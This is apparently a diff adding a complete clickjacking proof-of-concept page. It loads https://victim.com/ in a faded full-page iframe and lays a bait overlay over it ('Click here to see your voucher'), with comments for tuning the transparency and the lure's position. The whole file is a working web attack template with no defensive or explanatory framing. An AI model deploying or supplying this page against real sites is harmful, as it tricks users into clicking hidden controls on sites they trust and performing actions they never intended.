@@ -1,0 +1,32 @@
+<html>
+<head>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
+    <style>
+        #parent {
+        width: 2000px;
+        height: 2000px;
+        }
+        iframe {
+        width:100%;
+        height:100%;
+        border:0;
+        opacity: 0.4; <! -- adjust the transparence of iframe here  -->
+        }
+
+        #parent > div { <! -- adjust the position of the Clickjacking here  -->
+        opacity: 0.9;
+        position:fixed;
+        right:200px;
+        top:30px;
+        transition: 0.5s;
+        }
+    </style>
+</head>
+<body>
+<div id="parent">
+    <iframe src="https://victim.com/" ></iframe>
+    <div> <b>Click here to see your voucher => </b> <i class="glyphicon glyphicon-envelope" style="font-size:40px;"></i></div>
+</div>
+</body>
+</html>
+</pre>
